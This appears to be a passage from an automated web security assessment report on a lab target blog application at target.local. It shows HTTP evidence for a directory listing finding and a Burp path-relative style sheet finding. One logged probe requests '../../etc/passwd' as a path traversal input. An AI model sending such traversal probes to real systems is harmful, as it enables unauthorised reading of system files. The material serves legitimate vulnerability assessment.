+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32868&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz10mo3-19</code> — <code>artifacts/s-0006/ev-mqz10mo3-19/</code></div><div class="lbl">REQUEST</div><pre>GET /images/ HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1156
+content-type: text/html;charset=UTF-8
+date: Mon, 29 Jun 2026 09:39:35 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /images&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /images&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/image2.gif&quot; alt=&quot;[IMG]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;morning-dew.jpg&quot;&gt;morning-dew.jpg&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;267K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/image2.gif&quot; alt=&quot;[IMG]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;sunset.jpg&quot;&gt;sunset.jpg&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;221K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32868&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz11a9t-1d</code> — <code>artifacts/s-0006/ev-mqz11a9t-1d/</code></div><div class="lbl">REQUEST</div><pre>GET /images/?C=../../etc/passwd HTTP/1.1
+Host: target.local:32868
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1156
+content-type: text/html;charset=UTF-8
+date: Mon, 29 Jun 2026 09:40:06 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.54 (Debian)
+vary: Accept-Encoding
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
+&lt;html&gt;
+ &lt;head&gt;
+  &lt;title&gt;Index of /images&lt;/title&gt;
+ &lt;/head&gt;
+ &lt;body&gt;
+&lt;h1&gt;Index of /images&lt;/h1&gt;
+  &lt;table&gt;
+   &lt;tr&gt;&lt;th valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/blank.gif&quot; alt=&quot;[ICO]&quot;&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=N;O=D&quot;&gt;Name&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=M;O=A&quot;&gt;Last modified&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=S;O=A&quot;&gt;Size&lt;/a&gt;&lt;/th&gt;&lt;th&gt;&lt;a href=&quot;?C=D;O=A&quot;&gt;Description&lt;/a&gt;&lt;/th&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/back.gif&quot; alt=&quot;[PARENTDIR]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;/&quot;&gt;Parent Directory&lt;/a&gt;&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;  - &lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/image2.gif&quot; alt=&quot;[IMG]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;morning-dew.jpg&quot;&gt;morning-dew.jpg&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;267K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+&lt;tr&gt;&lt;td valign=&quot;top&quot;&gt;&lt;img src=&quot;/icons/image2.gif&quot; alt=&quot;[IMG]&quot;&gt;&lt;/td&gt;&lt;td&gt;&lt;a href=&quot;sunset.jpg&quot;&gt;sunset.jpg&lt;/a&gt;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;2026-06-27 15:38  &lt;/td&gt;&lt;td align=&quot;right&quot;&gt;221K&lt;/td&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
+   &lt;tr&gt;&lt;th colspan=&quot;5&quot;&gt;&lt;hr&gt;&lt;/th&gt;&lt;/tr&gt;
+&lt;/table&gt;
+&lt;address&gt;Apache/2.4.54 (Debian) Server at target.local Port 32868&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-8">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 8. [burp] Path-relative style sheet import (2 URLs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>burp</code></div>
+<div class="kv">Scope basis: burp scan (in-scope)</div>
+<div class="desc">The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):&lt;ol&gt;&lt;li&gt;The original response contains a path-relative style sheet import (see response 1).&lt;/li&gt;&lt;li&gt;When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).&lt;/li&gt;&lt;li&gt;Response 2 can be made to render in a browser's quirks mode. The page does not contain a doctype directive, and  [+1 more URL(s): http://target.local:32868/index.php] @ http://target.local:32868/</div>
+<div><b>Reproduction</b></div><pre>Burp が検出。証拠に request/response(Cookie/Authorization は伏字)。</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1r34w-28</code> — <code>artifacts/_/ev-mqz1r34w-28/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32868
+
+GET / HTTP/1.1
+Host: target.local:32868
+Accept: */*</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 0
+
+HTTP/1.1 200 OK
+Date: Mon, 29 Jun 2026 09:58:00 GMT
+Server: Apache/2.4.54 (Debian)
+X-Powered-By: PHP/7.4.33
+Vary: Accept-Encoding
+Content-Length: 5630
+Content-Type: text/html; charset=UTF-8
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Blog Home&lt;/title&gt;
+    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div class=&quot;container&quot;&gt;
+    &lt;h1&gt;Welcome to Our Blog&lt;/h1&gt;
+
+
+    &lt;form action=&quot;&quot; method=&quot;GET&quot;&gt;
+        &lt;label for=&quot;category&quot;&gt;Choose a category:&lt;/label&gt;
+        &lt;select name=&quot;category&quot; id=&quot;category&quot; onchange=&quot;this.form.submit()&quot;&gt;
+            &lt;option value=&quot;&quot;&gt;All Categories&lt;/option&gt;        
+            &lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Nature' &gt;Nature&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Tech' &gt;Tech&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Cooking' &gt;Cooking&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Photography' &gt;Photography&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Health' &gt;Health&lt;/option&gt;&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined variable: category in &lt;b&gt;/var/www/html/index.php&lt;/b&gt; on line &lt;b&gt;28&lt;/b&gt;&lt;br /&gt;
+&lt;option value='Secret' &gt;Secret&lt;/option&gt;        &lt;/select&gt;
+    &lt;/form&gt;
+
+    &lt;div class='post'&gt;
+                    &lt;h2&gt;The Magic of Morning Dew&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/morning-dew.jpg' alt='The Magic of Morning Dew' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Experience the serene beauty of morning dew as it glistens on the fresh green leaves, transforming the ordinary garden into a sparkling jewel under the sunrise....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Sunset Serenades&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/sunset.jpg' alt='Sunset Serenades' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;As the sun sets, the sky turns a palette of deep oranges, fiery reds, and calming purples, offering a perfect backdrop for an evening under the stars....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Forest Whisperings&lt;/h2&gt;
+                    &lt;p&gt;Category: Nature&lt;/p&gt;
+                    &lt;img src='images/forest.jpg' alt='Forest Whisperings' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Walking through the forest, one can hear the whispers of ancient trees, rustling leaves telling tales of old in the crisp, clean air....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Decoding Tech Trends&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/tech-trends.jpg' alt='Decoding Tech Trends' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;An analysis of emerging technology trends that will shape our future, from AI advancements to the rise of quantum computing....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Future of Robotics&lt;/h2&gt;
+                    &lt;p&gt;Category: Tech&lt;/p&gt;
+                    &lt;img src='images/robotics.jpg' alt='The Future of Robotics' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the potential impacts of robotics in various industries, and how they are set to revolutionize efficiency and productivity....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Mediterranean Diet Secrets&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/mediterranean-diet.jpg' alt='Mediterranean Diet Secrets' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Unlock the longevity secrets of the Mediterranean diet and discover recipes that combine both taste and health....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Art of French Baking&lt;/h2&gt;
+                    &lt;p&gt;Category: Cooking&lt;/p&gt;
+                    &lt;img src='images/french-baking.jpg' alt='The Art of French Baking' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Master the art of French baking with these simple steps for making the perfect croissant....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Beyond the Camera Lens&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/camera-lens.jpg' alt='Beyond the Camera Lens' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Exploring the art of photography through a lens of expression and creativity, where every picture tells a story....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;Urban Photography Tips&lt;/h2&gt;
+                    &lt;p&gt;Category: Photography&lt;/p&gt;
+                    &lt;img src='images/urban-photography.jpg' alt='Urban Photography Tips' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Capture the essence of urban life with these practical tips on urban photography, from choosing the right gear to finding the perfect angle....&lt;/p&gt;
+                &lt;/div&gt;&lt;div class='post'&gt;
+                    &lt;h2&gt;The Healing Power of Yoga&lt;/h2&gt;
+                    &lt;p&gt;Category: Health&lt;/p&gt;
+                    &lt;img src='images/yoga.jpg' alt='The Healing Power of Yoga' style='width:200px;height:200px;'/&gt;
+                    &lt;p&gt;Discover the transformative power of yoga on your body and mind, featuring success stories and tips for beginners....&lt;/p&gt;
+                &lt;/div&gt;&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+</body></html>
